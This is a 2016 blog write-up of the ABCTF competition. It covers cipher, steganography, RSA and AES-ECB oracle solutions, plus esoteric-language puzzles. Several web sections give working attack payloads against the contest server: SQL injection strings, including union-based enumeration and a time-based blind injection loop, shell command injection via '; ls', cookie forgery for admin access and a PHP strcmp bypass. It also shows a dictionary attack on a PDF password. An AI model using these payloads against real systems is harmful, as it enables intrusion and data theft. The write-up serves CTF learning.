---
layout: post
alias: "/blog/2016/07/23/abctf-2016/"
date: "2016-07-23T10:33:17+09:00"
title: "ABCTF 2016"
tags: [ "ctf", "writeup", "abctf" ]
---

-   <http://abctf.xyz/>
-   <https://ctftime.org/event/333>
-   writeups of other members
    -   [tsun](https://ctftime.org/user/10437): <https://tsunpoko.github.io/abctf2016/> (Japanese)
    -   [junk_coken](https://ctftime.org/user/16766): <http://junk-coken.hatenablog.com/entry/2016/07/24/030423> (Japanese)
    -   [yue82](https://ctftime.org/user/16859): <http://yuelab82.hatenablog.com/entry/2016/07/24/042028> (Japanese)
    -   lenia: <http://lenia23.hateblo.jp/entry/2016_abctf> (Japanese)

We participated as a team [CTF wo Suru](https://ctftime.org/team/27420), and got $23$rd place.

For this writeup, the almost all of the web problems are solved by [tsun](https://ctftime.org/user/10437) and the many of others are solved by me.

## Caesar Salad - 10

Rotate letters.

``` sh
$ echo 'xyzqc{t3_qelrdeq_t3_k33a3a_lk3_lc_qe3p3}' | tr x-za-w a-z
abctf{w3_thought_w3_n33d3d_on3_of_th3s3}
```

## Elemental - 10

There is the password in the html:

``` html
...
    </body>
    <!-- 7xfsnj65gsklsjsdkj -->
              <script type="text/javascript" src="fade.js"></script>
</html>
```

Send it and you'll get `ABCTF{insp3ct3d_dat_3l3m3nt}`.

## GZ - 30

Just uncompress as gzip.

``` sh
$ file flag
flag: gzip compressed data, was "flag", last modified: Sun Jun 26 17:22:38 2016, from Unix
$ cat flag | gunzip
ABCTF{broken_zipper}
```

## The Flash - 35

Like `Elemental - 10`, but it's base64 encoded,

``` html
...
    </body>
    <!-- c3RvcHRoYXRqcw== -->
              <script type="text/javascript" src="fade.js"></script>
</html>
```

``` sh
$ echo c3RvcHRoYXRqcw== | base64 -d
stopthatjs
```

Send the `stopthatjs` as password and you'll get `ABCTF{no(d3)_js_is_s3cur3_dasjkhadbkjfbjfdjbfsdajfasdl}`.

## Archive Me - 50

Use the <https://archive.org/>.
There is the flag `ABCTF{Archives_are_useful!}` in <https://web.archive.org/web/20160510192307/http://abctf.xyz>.
You should notice that there are two archived pages at the day, and you must open the correct one.

## Chocolate - 50

It seems no hints in the html, so let's see the HTTP header.

``` sh
$ curl http://yrmyzscnvh.abctf.xyz/web3/ -D-
...
Set-Cookie: coookie=e2FkbWluOmZhbHNlfQ%3D%3D
...
```

``` sh
$ echo e2FkbWluOmZhbHNlfQ%3D%3D | urlencode -d | base64 -d
{admin:false}
```

Modify the cookie to be admin.

``` sh
$ echo -n '{admin:true}' | base64
e2FkbWluOnRydWV9
$ curl http://yrmyzscnvh.abctf.xyz/web3/ -D- -H 'Cookie: coookie=e2FkbWluOnRydWV9'
...
                                        Wow! You're an admin, maybe. Well anyway, here is your flag, ABCTF{don't_trust_th3_coooki3}                             </h1>
...
```

## Best Ganondorf - 50

The filename is `.jpg`, but `file` says that it's not jpeg.

``` sh
$ file ezmonay.jpg
ezmonay.jpg: PDP-11 UNIX/RT ldp
```

So we should fix the magic number, from:

``` sh
$ xxd ezmonay.jpg | head -n1
00000000: 0101 0100 4800 4800 00ff db00 4300 0302  ....H.H.....C...
```

to:

``` sh
$ xxd ezmonay.jpg | head -n1
00000000: ffd8 0100 4800 4800 00ff db00 4300 0302  ....H.H.....C...
```

`abctf{tfw_kage_r3kt_nyway}`

## Yummi - 60

The filename is `baconian.bmp`. This reminds me of the Baconian cipher.
Read it up to down and left to right, you can get `abctflovesbaconian`.

## Slime Season 3 - 60

$7308$ quarters, $4$ dimes and $3$ pennies are the optimal.
You can solve this by your hand.
`ABCTF{7315}`.

## Old RSA - 70

Use [factordb.com](http://www.factordb.com/index.php?query=70736025239265239976315088690174594021646654881626421461009089480870633400973) to factorize.
$p = 238324208831434331628131715304428889871, q = 296805874594538235115008173244022912163$.

``` python
#!/usr/bin/env python3
c = 29846947519214575162497413725060412546119233216851184246267357770082463030225
p = 238324208831434331628131715304428889871
q = 296805874594538235115008173244022912163
n = p * q
e = 3

import gmpy2
from Crypto.PublicKey import RSA
d = lambda p, q, e: int(gmpy2.invert(e, (p-1)*(q-1)))

key = RSA.construct((n, e, d(p,q,e)))
import binascii
print(binascii.unhexlify(hex(key.decrypt(c))[2:]).decode())
```

`ABCTF{th1s_was_h4rd_in_1980}`

## L33t H4xx0r - 70

[strcmp()](http://php.net/manual/function.strcmp.php) with `Array` returns `NULL`.

``` php
strcmp("foo", array()) => NULL + PHP Warning
```

So <http://yrmyzscnvh.abctf.xyz/web6/?password[]=foo> dumps the `abctf{always_know_whats_going_on}`.


## AES Mess - 75

AES is a block cipher.
The [Electronic Codebook (ECB)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29) is used in this time, so you can decrypt it blockwise.

Split the ciphertext with $32$byte each, and find them from the given list,

```
e220eb994c8fc16388dbd60a969d4953 abctf{looks_like
f042fc0bce25dbef573cf522636a1ba3                 _you_can_break_a
fafa1a7c21ff824a5824c5dc4a376e75                 es}
```

## PasswordPDF - 80

Use dictionary attack.

``` sh
$ pdfcrack --wordlist=crackstation-human-only.txt mypassword.pdf
```

I used the dictionary on <https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm>.
The pdf password is `elephant`. Invert the pdf content: `ABCTF{Damn_h4x0rz_always_bypassing_my_PDFs}`.

## Get 'Em All - 80

SQL Injection.
`' or 1 = 1 -- ` shows all the records.

`ABCTF{th4t_is_why_you_n33d_to_sanitiz3_inputs} `.

## Safety First - 95

The input is passed to `expr` command, without escaping.
You may notice this if you often use a shell.

``` sh
$ curl http://yrmyzscnvh.abctf.xyz/web7/ -F expression='; ls'
abctf{watch_0ut_f0r_syst3m}
calc.js
index.php
main.css
main.css
<html>
<head>
  <link rel="stylesheet" href="main.css">
    <script type="text/javascript" src="calc.js"></script>
...
```

## Always So Itchy - 100

Google with `Dialga1234`.
You'll find a Scratch application. In the source <https://scratch.mit.edu/projects/108998724/#editor>, there is the flag `ABCTF{DoYouThinkISpentTooMuchTimeOnThis}`.

## RacecaR - 100

Only doing.

``` c++
#include <iostream>
#define repeat(i,n) for (int i = 0; (i) < (n); ++(i))
#define repeat_from(i,m,n) for (int i = (m); (i) < (n); ++(i))
using namespace std;
int main() {
    string s; cin >> s;
    int n = s.length();
    repeat_from (len,3,n+1) {
        repeat (l,n+1) {
            int r = l + len;
            if (r >= n) break;
            bool is_palindrome = true;
            repeat (i,len) {
                if (s[l + i] != s[r - i - 1]) {
                    is_palindrome = false;
                    break;
                }
            }
            if (is_palindrome) cout << s.substr(l, len) << endl;
        }
    }
    return 0;
}
```

## A Small Broadcast - 125

RSA is decryptable when there are many ciphertexts ($\ge e$) for the same plaintext and the same $e$. <https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA>. Implement it.

``` python
#!/usr/bin/env python3
N1 = 79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179
C1 = 34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987
N2 = 58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637
C2 = 48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176
N3 = 95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811
C3 = 55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748

import functools
import itertools

def chinese_remainder(n, a): # https://rosettacode.org/wiki/Chinese_remainder_theorem
    sum = 0
    prod = functools.reduce(lambda a, b: a*b, n)
    for n_i, a_i in zip(n, a):
        p = prod // n_i
        sum += a_i * mul_inv(p, n_i) * p
    return sum % prod
 
def mul_inv(a, b): # https://rosettacode.org/wiki/Chinese_remainder_theorem
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a > 1:
        q = a // b
        a, b = b, a%b
        x0, x1 = x1 - q * x0, x0
    if x1 < 0: x1 += b0
    return x1

def inv_pow(c, e):
    low = -1
    high = c+1
    while low + 1 < high:
        m = (low + high) // 2
        p = pow(m, e)
        if p < c:
            low = m
        else:
            high = m
    m = high
    assert pow(m, e) == c
    return m
 
N = [N1, N2, N3]
C = [C1, C2, C3]
e = len(N)
a = chinese_remainder(N, C)
for n, c in zip(N, C):
    assert a % n == c
m = inv_pow(a, e)
print(bytes.fromhex(hex(m)[2:]).decode())
```

## Encryption Service - 140

In this time, you can get any ciphertext for the plaintext for `ENCRYPT:${your_input}${flag}`.
Using the fact that AES is a block cipher, you can know the first letter of the unknown part of the flag.

If you send `#######`, you'll get the ciphertext for `ENCRYPT:#######ABCTF{something}`, and the first block is the ciphertext for only `ENCRYPT:#######A`.
You can send for all `#######A` to `#######Z` and get the ciphertexts, you should compare the first blocks with the `#######` one, then you will know the first letter of the flag is `A`. Do this recursively.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='107.170.122.6')
parser.add_argument('port', nargs='?', default=7765, type=int)
args = parser.parse_args()

header = 'ENCRYPT:'
def query(s):
    with remote(args.host, args.port) as p:
        log.info('try: ' + repr(header + s))
        p.recvuntil('Send me some hex-encoded data to encrypt:\n')
        p.sendline(s.encode('hex'))
        p.recvuntil('Here you go:')
        t = p.recvline().strip()
        u = []
        while t:
            u.append(t[:32])
            t = t[32:]
        log.info(repr(u))
        return u

import string
flag = ''
while True:
    padding = '#' * ((- len(header + flag + 'A')) % 16)
    assert len(header + padding + flag + 'A') % 16 == 0
    i =    len(header + padding + flag + 'A') // 16 - 1
    correct = query(padding)[i]
    for c in list(string.printable):
        if query(padding + flag+ c)[i] == correct:
            flag += c
            log.success('flag updated: ' + repr(flag))
            break
    else:
        break
log.success('flag: ' + repr(flag))
```

## Reunion - 150

Input an id number like $2$ shows a records: <http://yrmyzscnvh.abctf.xyz/web8/?id=2>.
This id number is injectable like `0 or 1 = 1`: <http://yrmyzscnvh.abctf.xyz/web8/?id=0+or+1+%3D+1>.

Use `union`. It is used like `1 union select 1,2,3,4` and shows some valuse.
List the tables with `1 union select table_name,2,3,4 from information_schema.tables where table_schema = database()`, then you'll know that `w0w_y0u_f0und_m3` exists.
Next, see the columns of it with `1 union select column_name,2,3,4 from information_schema.columns where table_name = 0x7730775f7930755f6630756e645f6d33`.
`0x7730775f7930755f6630756e645f6d33` is the hex encoded `w0w_y0u_f0und_m3`, because `'` and `"` are not available in this injection (see the result of `0 or 'hoge' = 'hoge'`).
Anyway, there is the column `f0und_m3` and `1 union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3` tell you the flag is `abctf{uni0n_1s_4_gr34t_c0mm4nd}`.

## Sexy RSA - 160

RSA cipher is strong. If only $c,n,e$ are given, $p,q$ must be gussable.
For this $n$, $p, q = \lfloor\sqrt{n}\rfloor \pm 3$.

``` python
#!/usr/bin/env python3
c = 293430917376708381243824815247228063605104303548720758108780880727974339086036691092136736806182713047603694090694712685069524383098129303183298249981051498714383399595430658107400768559066065231114145553134453396428041946588586604081230659780431638898871362957635105901091871385165354213544323931410599944377781013715195511539451275610913318909140275602013631077670399937733517949344579963174235423101450272762052806595645694091546721802246723616268373048438591
n = 1209143407476550975641959824312993703149920344437422193042293131572745298662696284279928622412441255652391493241414170537319784298367821654726781089600780498369402167443363862621886943970468819656731959468058528787895569936536904387979815183897568006750131879851263753496120098205966442010445601534305483783759226510120860633770814540166419495817666312474484061885435295870436055727722073738662516644186716532891328742452198364825809508602208516407566578212780807
e = 65537

def sqrt(x):
    low = -1
    high = c+1
    while low + 1 < high:
        m = (low + high) // 2
        y = m*m
        if y < x:
            low = m
        else:
            high = m
    m = high
    return m

r = sqrt(n)
p = r + 3
q = r - 3
assert n == p * q

import gmpy2
from Crypto.PublicKey import RSA
d = lambda p, q, e: int(gmpy2.invert(e, (p-1)*(q-1)))

key = RSA.construct((n, e, d(p,q,e)))
import binascii
print(binascii.unhexlify(hex(key.decrypt(c))[2:]).decode())
```

## Inj3ction - 170

You can do time-based blind sql injection:

``` sh
$ s=sn ; for c in {a..z} ; do echo -n $c ' ' ; curl http://yrmyzscnvh.abctf.xyz/injection3/login.php -F username=\'' OR (select if(exists (select * from users where password like "'$s$c'%"), sleep(1000), 0)) -- ' -F password=foo -F submit=Submit ; echo ; done
```

and you can login with username: `john` and password: `snout`. However this user is not an admin.
Also you can know that the `john/snout` is the only record for the table.

You need to make a new record, use `union`.
username: `baz' union select "foo",true,"bar",false -- ` and password: `bar` allow you to login as an admin. The last `false` is for a dummy column.

## Frozen Recursion - 250

The binary runs python interpreter internally.
It is created by [Freeze](https://wiki.python.org/moin/Freeze).
So you can use `PYTHONINSPECT` environment variable.

``` sh
$ export PYTHONINSPECT=t
$ ./recursive_python
You wish it was that easy!
>>> ^Z
zsh: suspended  ./recursive_python
$ strings unstep_f67baaeb | grep -o 'flag{.*}'
flag{python_taken_2_far}
```

(This problem is corrupted).

## QSet 1 - 100

### language specification

$\newcommand{\llbrace}{\\{\\!\\{}$
$\newcommand{\rrbrace}{\\}\\!\\}}$
$\newcommand{\lbracket}{\left[}$
$\newcommand{\rbracket}{\right]}$
It is an esoteric language for a counter machine.
The program is a sequence of pair of multiset of symbols.
For example, $\lbracket (\llbrace o_0 \\rrbrace, \llbrace i_0 \\rrbrace), (\llbrace o_0 \\rrbrace, \llbrace i_1 \\rrbrace) \rbracket$ (a program to add 2 inputs).

The semantic is like:

``` python
S = input : multiset<symbol>
while True:
    for (Y, X) : (multiset<symbol>, multiset<symbol>) in program:
        if X is a subset of S:
            S = S - X + Y
            break
    if S is not modified:
        break
output = S : multiset<symbol>
```

The syntax is:

```
<program> := <replace> | <replace> "," <program>
<replace> := <items> "/" <items>
<items> := <item> " " <items>
<item> := string
```

The interface is: both input and output are a finite sequence of a positive integers, and encode the numbers like the unary numeral system.
We can describe it using a multiplicity function: for the given $\vec{a} = \\{ a_i \\}$, the encoded multiset is $U$ where the multiplicity function $m_U : i_k \mapsto a_k$.
For example, an input $\lbracket 2, 3, 1 \rbracket$ is encoded as $\llbrace i_0, i_0, i_1, i_1, i_1, i_2 \rrbrace$.
The output is similar, but unnecessary symbols are forbidden.

### solution

This is very easy.

```
restore i0 / restore preserved, / restore, o0 preserved / i0, restore / i1, / preserved o0
```

``` sh
$ nc 107.170.122.6 7771
Send me a QSet program that multiplies 2 positive integer inputs together
restore i0 / restore preserved, / restore, o0 preserved / i0, restore / i1, / preserved o0
Thanks! Testing it...
Nice job! Here's your flag:
ABCTF{es0teric_l4ngs_r_fun}
Bye!
```

## QSet 2 - 150

The algorithm is:

``` python
while i0 > 0:
    i0 -= 2*o0 + 1
    o0 += 1
```

And the code is below. I write a conservative translator for this.

```
rename t / rename o0, update / rename, update o0 / update t i0 i0, update o0 / update t i0, check o0 / update i0, update o0 / update t, / update, rename i0 / check i0, terminate / check, check o0 / start i0, terminate / terminate i0, / terminate, start i0 / i0
```

``` sh
$ nc 107.170.122.6 7772
Send me a QSet program that calculates the floor of the square root of an input (<10,000)
rename t / rename o0, update / rename, update o0 / update t i0 i0, update o0 / update t i0, check o0 / update i0, update o0 / update t, / update, rename i0 / check i0, terminate / check, check o0 / start i0, terminate / terminate i0, / terminate, start i0 / i0
Thanks! Testing it...
Nice job! Here's your flag:
ABCTF{why_w0uld_any1_do_th1s?}
Bye!
```

The translator is below. This is a conservative translator, it means that this translator don't spoil the fun of this language. enjoy!

`translator.py`:

``` python
#!/usr/bin/env python3
import sys
import ply.lex
import ply.yacc

tokens = (
    'IDENTIFIER',
    'AT',
    'SLASH',
    'COMMA',
    'LBRACE',
    'RBRACE',
)

def lex():
    t_IDENTIFIER = r"[\w\-_']+"
    t_AT = r'@'
    t_SLASH = r'/'
    t_COMMA = r','
    t_LBRACE = r'{'
    t_RBRACE = r'}'
    def t_newline(t):
        r'\n+'
        t.lineno += len(t.value)
    t_ignore = ' \t'
    def t_error(t):
        print("Illegal character '%s'" % t.value[0])
        t.skip(1)
    ply.lex.lex()

def n_program(sts):
    return { 'type': 'program', 'statements': sts }
def n_replace(l, r):
    n = l.count('@')
    while '@' in l:
        l.remove('@')
    return { 'type': 'replace', 'pop': n, 'left': l, 'right': r }
def n_block(pat, prog):
    return { 'type': 'block', 'push': pat, 'program': prog }

def yacc():
    def p_program(p):
        '''program :
                   | statement
                   | statement COMMA program'''
        if 3 < len(p):
            p[0] = p[3]
            p[3]['statements'].insert(0, p[1])
        elif 1 < len(p):
            p[0] = n_program([ p[1] ])
        else:
            p[0] = n_program([])
    def p_statement_block(p):
        'statement : items LBRACE program RBRACE'
        p[0] = n_block(p[1], p[3])
    def p_statement_replace(p):
        'statement : replace'
        p[0] = p[1]
    def p_replace(p):
        'replace : litems SLASH items'
        p[0] = n_replace(p[1], p[3])
    def p_litems(p):
        '''litems :
                  | IDENTIFIER litems
                  | AT litems'''
        p[0] = []
        if len(p) != 1:
            p[0] += [ p[1] ] + p[2]
    def p_items(p):
        '''items :
                 | IDENTIFIER items'''
        p[0] = []
        if len(p) != 1:
            p[0] += [ p[1] ] + p[2]
    def p_error(p):
        if p:
            print("Syntax error at token", p.type, file=sys.stderr)
        else:
            print("Syntax error at EOF", file=sys.stderr)
        sys.exit(1)
    ply.yacc.yacc(debug=False, write_tables=False)

def preprocess(data):
    acc = []
    for line in data.split('\n'):
        if '#' in line:
            acc.append(line[:line.index('#')])
        else:
            acc.append(line)
    return '\n'.join(acc)

def translate(data):
    code = []
    stack = []
    def go(a):
        if a['type'] == 'program':
            for st in a['statements']:
                go(st)
        elif a['type'] == 'block':
            stack.append(a['push'])
            go(a['program'])
            stack.pop()
        elif a['type'] == 'replace':
            assert a['pop'] <= len(stack)
            r = sum(stack, [])
            l = sum(stack, [])
            if a['pop']:
                l = sum(stack[: - a['pop']], [])
            code.append(' '.join(l + a['left'] + ['/'] + r + a['right']))
    lex()
    yacc()
    a = ply.yacc.parse(data)
    go(a)
    return ', '.join(code)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('file', nargs='?', default='-')
    args = parser.parse_args()

    if args.file == '-':
        code = sys.stdin.read()
    else:
        with open(args.file) as fh:
            code = fh.read()

    print(translate(preprocess(code)))
```

## QSet 3 - 200

This is a bit difficult. The problem statement is:

``` sh
$ nc 107.170.122.6 7773
Send me a QSet program that outputs the RSA private key for inputs [p, q, e]. If you believe your program is optimized and working but doesn't pass the test cases contact Arxenix on IRC.
```

i.e. print $d = e^{-1} \pmod{(p-1)(q-1)}$ for give $p, q, e$.

Also, if the length of the program is more than 2000 bytes, it says `Program size too large!`.


The basic algorithm is the extended Euclidean algorithm.
Also we must do optimize like 'y y y y y y y y y y / x x x x x x x x x x, y / x' instead of 'y / x'. This is almost $10 \times$ faster, but $10 \times$ long on the source code, so we are also required code compaction.
Finally I got the below code and the flag.

```
0/1,2/0 i0,2/0,3/2 i1,3/2,3 4 i0 i0 i0 i0 i0 i0 i0 i0 i0 i0/3 4 5 5 5 5 5 5 5 5 
5 5,3 4 i0/3 4 5,3/3 4,3 6 7 5 6 7 5 6 7 5 6 7 5 6 7 5 6 7 5 6 7 5 6 7 5 6 7 5 6
 7 5/3 i0 i0 i0 i0 i0 i0 i0 i0 i0 i0,3 6 7 5/3 i0,3 4/3 i1,3/3 5 6 7,8/3,8 9 9 9
 9 9 9 9 9 9 9/8 i2 i2 i2 i2 i2 i2 i2 i2 i2 i2,8 9/8 i2,a/8,b c/a,d/b,ef 9/d 9,g
/d,ef h i h i h i h i h i h i h i h i h i h i/ef 9 9 9 9 9 9 9 9 9 9,ef h i/ef 9
,ej/ef,ej k i i i i i/ej k l l l l l,ej k i/ej k l,ej m/ej k,ej m l l l l l/ej m
 6 i 6 i 6 i 6 i 6 i,ej m l/ej m 6 i,ej k n 6/ej m 6,ej o/ej m i,ej p/ej m,ej o/
ej o i i i i i,ej o/ej o i,eq/ej o,ej p/ej p l l l l l,ej p/ej p l,eq n/ej p,ej 
k/ej,eq 6 6 6 6 6 6 6 6 6 6/eq h h h h h h h h h h,eq 6/eq h,er/eq,er 9 9 9 9 9 
9 9 9 9 9/er l l l l l l l l l l,er 9/er l,es/er,es t t t t t t t t t t/es 7 7 7
 7 7 7 7 7 7 7,es t/es 7,e u/es,e u 7 v w x 7 v w x 7 v w x 7 v w x 7 v w x 7 v 
w x 7 v w x 7 v w x 7 v w x 7 v w x/e u t t t t t t t t t t,e u 7 v w x/e u t,ey
/e u,ey z A z A z A z A z A z A z A z A z A z A/ey c c c c c c c c c c,ey z A/ey
 c,eB/ey,eB C z z z z z z z z z z/eB C D D D D D D D D D D,eB C z/eB C D,eB/eB C
,eB v D v D v D v D v D v D v D v D v D v D/eB z z z z z z z z z z,eB v D/eB z,e
B C/eB n,eB/eB D v,eE/eB,eE/eE F v F v F v F v F v F v F v F v F v F v,eE/eE F v
,eE/eE F F F F F F F F F F,eE/eE F,eG/eE,eG H w w w w w w w w w w/eG H z z z z z
 z z z z z,eG H w/eG H z,eG I/eG H,eG I z z z z z z z z z z/eG I v w v w v w v w
 v w v w v w v w v w v w,eG I z/eG I v w,eG H v/eG I v,eG J/eG I w,eG K/eG I,eG 
J/eG J w w w w w w w w w w,eG J/eG J w,eL/eG J,eG K/eG K z z z z z z z z z z,eG 
K/eG K z,eL/eG K,eG H/eG,eL c c c c c c c c c c/eL x x x x x x x x x x,eL c/eL x
,eM/eL,eM/eM z c z c z c z c z c z c z c z c z c z c,eM/eM z c,eM/eM z z z z z z
 z z z z,eM/eM z,eN/eM,eN F F F F F F F F F F/eN A A A A A A A A A A,eN F/eN A,e
O/eN,d/eO,g/g 7,g o0/g F,g/g 6,g/g 9,g/g c,/g,1 i0/i0
```

The generator is below.

`generator.py`:

``` python
#!/usr/bin/env python3

gen_counter = 0
def gen():
    global gen_counter
    gen_counter += 1
    return 'g%d' % gen_counter

state = [ 's', 0 ]
def cur():
    global state
    return '-'.join(map(str, state))
def nxt():
    global state
    return '-'.join(map(str, state[:-1] + [ state[-1] + 1 ]))
def get_state(label, cont):
    global state
    if label is None and cont is None:
        label = cur()
        cont  = nxt()
        state[-1] += 1
    assert label is not None
    assert cont  is not None
    return (label, cont)

class block(object):
    def __init__(self, label):
        self.label = label
    def __enter__(self, *args):
        print(self.label, '{')
    def __exit__(self, *args):
        print('},')
def repl(xs, ys):
    assert isinstance(xs, list)
    assert isinstance(ys, list)
    print(*xs, '/', *ys, ',')

def incr(x, label=None, cont=None):
    label, cont = get_state(label, cont)
    assert isinstance(x, str)
    with block(label):
        repl( ['@', cont, x], [] )

def decr(x, label=None, cont=None):
    label, cont = get_state(label, cont)
    assert isinstance(x, str)
    with block(label):
        repl( ['@', cont], [x] )
        repl( ['@', cont], [] )

def move(xs, ys, optimize=10, label=None, cont=None):
    label, cont = get_state(label, cont)
    assert isinstance(xs, list)
    assert isinstance(ys, list)
    with block(label):
        repl( ys * optimize, xs * optimize )
        repl( ys,          xs ) # destructive
        repl( ['@', cont], [] )

def sub(xs, ys, optimize=10, label=None, cont=None):
    label, cont = get_state(label, cont)
    assert isinstance(xs, list)
    assert isinstance(ys, list)
    with block(label):
        repl( [],          (xs + ys) * optimize )
        repl( [],          xs + ys )
        repl( [],          xs * optimize )
        repl( [],          xs ) # limited subtraction
        repl( ['@', cont], [] )

def copy(x, ys, optimize=10, label=None, cont=None):
    label, cont = get_state(label, cont)
    assert isinstance(x, str)
    assert isinstance(ys, list)
    t = gen()
    stt = gen()
    move([x], [t],      optimize=optimize, label=label, cont=stt)
    move([t], [x] + ys, optimize=optimize, label=stt, cont=cont)

def mult(x, y, zs, optimize=10, label=None, cont=None):
    print('# mult', x, y, zs)
    label, cont = get_state(label, cont)
    assert isinstance(x, str)
    assert isinstance(y, str)
    assert isinstance(zs, list)
    restore = gen()
    preserved = gen()
    with block(label):
        repl( [restore] +  [x] * optimize, [restore] + [preserved] * optimize )
        repl( [restore, x],     [restore, preserved] )
        repl( [],               [restore] )
        repl( [*zs, preserved] * optimize, [x] * optimize )
        repl( [*zs, preserved], [x] )
        repl( [restore],        [y] )
        repl( [],               [preserved, *zs] )
        repl( ['@', cont],      [] )

def divmod(x, y, ps, q, optimize=10, label=None, cont=None):
    print('# divmod', x, y, ps, q)
    label, cont = get_state(label, cont)
    assert isinstance(x, str)
    assert isinstance(y, str)
    assert isinstance(ps, list)
    assert isinstance(q, str)
    # q sholud be zero at first
    loop = gen()
    do   = gen()
    done = gen()
    just = gen()
    with block(label):
        with block(loop):
            repl( [y] * optimize,       [q] * optimize )
            repl( [y],       [q] )
            repl( ['@', do], [] )
        with block(do):
            repl( [q] * optimize,          [x, y] * optimize )
            repl( [q],               [x, y] )
            repl( ['@', loop, *ps, x], [x] )
            repl( ['@', done], [y] )
            repl( ['@', just], [] )
        with block(done):
            repl( [],               [y] * optimize )
            repl( [],               [y] )
            repl( ['@', '@', cont], [] )
        with block(just):
            repl( [],                  [q] * optimize )
            repl( [],                  [q] )
            repl( ['@', '@', cont, *ps], [] )
        repl( [loop], [] )

repl([ cur() ], [ 'start' ])

decr('i0')
decr('i1')
mult('i0', 'i1', ['A', 'M'])
move([ 'i2' ], [ 'B' ])
incr('V')

repl([ 'while' ], [ cur() ])
with block('while'):
    repl(['@', 'do', nxt(), 'B'], [ 'B' ])
    repl(['@', 'done'], [])
state[-1] += 1

with block('do'):
    move([ 'B' ], [ 'B1', 'B2' ])
    divmod('A', 'B2', [ 'K' ], 'C', optimize=5)
    move([ 'B1' ], [ 'A' ])
    move([ 'C'  ], [ 'B' ])

    copy('M', [ 'M1', 'M2', 'M3' ])
    move([ 'V' ], [ 'V1', 'V2' ])
    mult('V1', 'K', [ 'M1' ])
    sub([ 'U' ], [ 'M1' ])
    divmod('M1', 'M2', [], 'V1')
    move([ 'M3' ], [ 'V' ])
    sub([  'V1' ], [ 'V' ])
    move([ 'V2' ], [ 'U' ])

    repl([ '@', 'while' ], [ cur() ])

with block('done'):
    repl([], ['M'])
    repl([ 'o0' ], ['U'])
    repl([], ['A'])
    repl([], ['B'])
    repl([], ['V'])
    repl(['@'], [])

repl([ 'start', 'i0' ], [ 'i0' ])
```

`compressor.py`:

``` python
#!/usr/bin/env python3
import sys
import string

def is_keyword(s):
    if s in '/,':
        return True
    if s[0] in 'oi':
        try:
            int(s[1:])
            return True
        except ValueError:
            pass
    return False

idchars = string.digits + string.ascii_letters
def gen_identifiers():
    xs = list(idchars)
    ys = []
    while True:
        for x in xs:
            yield x
            for z in idchars:
                y = x + z
                if not is_keyword(y):
                    ys.append(y)
        xs, ys = ys, []
identifiers = gen_identifiers()

t = sys.stdin.read()
t = ' / '.join(t.split('/'))
t = ' , '.join(t.split(','))
t = t.split()
s = ''
f = {}
for x in t:
    if s and s[-1].isalnum() and x.isalnum():
        s += ' '
    if is_keyword(x):
        s += x
    else:
        if x not in f:
            f[x] = next(identifiers)
        s += f[x]
print(s)
```

## Memo

-   Problems are not difficult. This is very helpful for newbies.
-   There is no solved count. (It is given in the [gist](https://gist.github.com/bobacadodl/c47155eb4d28ed08b61730ca141f015c) in the event).
-   Updating/Adding problems is not notified. Why? This was too bad.
-   It seems admins are slow to fix problems. (The time difference may cause this).
-   There are many corrupted flags.
